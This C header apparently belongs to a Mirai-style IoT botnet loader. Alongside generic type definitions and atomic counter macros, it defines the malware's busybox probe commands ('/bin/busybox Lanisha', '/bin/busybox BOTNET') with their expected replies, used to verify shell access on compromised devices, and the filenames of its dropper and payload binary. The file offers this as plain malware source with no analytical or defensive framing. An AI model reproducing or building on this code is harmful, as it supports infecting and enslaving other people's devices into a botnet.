#pragma once

#include <stdint.h>

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define FALSE 0
#define TRUE 1
typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define ATOMIC_ADD(ptr,i) __sync_fetch_and_add((ptr),i)
#define ATOMIC_SUB(ptr,i) __sync_fetch_and_sub((ptr),i)
#define ATOMIC_INC(ptr) ATOMIC_ADD((ptr),1)
#define ATOMIC_DEC(ptr) ATOMIC_SUB((ptr),1)
#define ATOMIC_GET(ptr) ATOMIC_ADD((ptr),0)

#define TOKEN_QUERY "/bin/busybox Lanisha"
#define TOKEN_RESPONSE "Lanisha: applet not found"

#define EXEC_QUERY "/bin/busybox BOTNET"
#define EXEC_RESPONSE "BOTNET: applet not found"

#define FN_DROPPER "Lanisha-9Y8G6"
#define FN_BINARY "Lanisha-U79OL"

extern char *id_tag;